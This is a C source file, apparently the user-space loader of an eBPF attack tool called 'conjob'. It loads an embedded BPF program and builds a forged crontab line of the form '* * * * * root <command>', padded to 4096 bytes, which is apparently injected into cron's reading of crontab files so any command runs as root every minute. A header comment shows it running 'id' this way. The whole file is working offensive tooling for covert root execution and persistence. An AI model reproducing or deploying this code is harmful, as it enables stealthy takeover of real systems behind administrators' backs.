// # ./conjob '( echo "# id" ; id ) > /tmp/conjob'

#include <stdlib.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <time.h>

#include "bpf_load.h"
#include "common_user_bpf.h"

#include "kern.o.h"

void print_usage(char** argv) {
  fprintf(stderr, "usage: %s <command> [target pid] [printk|comm_map]\n", argv[0]);
  exit(1);
}

int main(int argc, char** argv) {
  if (argc < 2) {
    print_usage(argv);
  }

  if (!load_bpf_file_from_buffer(kern_o, kern_o_len)) {
    return 1;
  }

  uint32_t key = 0;
  if (argc > 2) {
    uint64_t pid = (uint64_t)atoi(argv[2]);
    bpf_map_update_elem(map_fd[1], &key, &pid, BPF_ANY);
  }

  if (argc > 3) {
    if (strcmp("printk", argv[3]) != 0 && strcmp("comm_map", argv[3]) != 0) {
      print_usage(argv);
    }
  }

  char const* prefix = "SHELL=/bin/sh\n* * * * * root ";
  char payload[0x1000];
  strcpy(payload, prefix);
  strncpy(&payload[strlen(prefix)], argv[1], sizeof(payload)-strlen(prefix)-1);
  size_t l = strlen(payload);
  payload[l] = '\n';
  l += 1;
  memset(&payload[l], '#', sizeof(payload)-l);
  payload[0x1000-1] = '\n';
  bpf_map_update_elem(map_fd[2], &key, payload, BPF_ANY);

  time_t base_time = time(NULL);
  if (base_time == -1) {
    perror("time");
    return 1;
  }
  bpf_map_update_elem(map_fd[3], &key, &base_time, BPF_ANY);

  puts("loaded...");

  if (argc > 3) {
    if (strcmp("printk", argv[3]) == 0) {
      read_trace_pipe();
    } else if (strcmp("comm_map", argv[3]) == 0) {
      char clear[256] = {0};
      while (1) {
        char buf[256];
        int err = bpf_map_lookup_elem(map_fd[0], &key, buf);
        if (!err) {
          size_t l = strlen(buf);
          if (l > 0) {
            puts(buf);
          }
        }
        bpf_map_update_elem(map_fd[0], &key, clear, BPF_ANY);
        sleep(1);
      }
    }
  } else {
    while (1) {
      sleep(1);
    }
  }

  return 0;
}
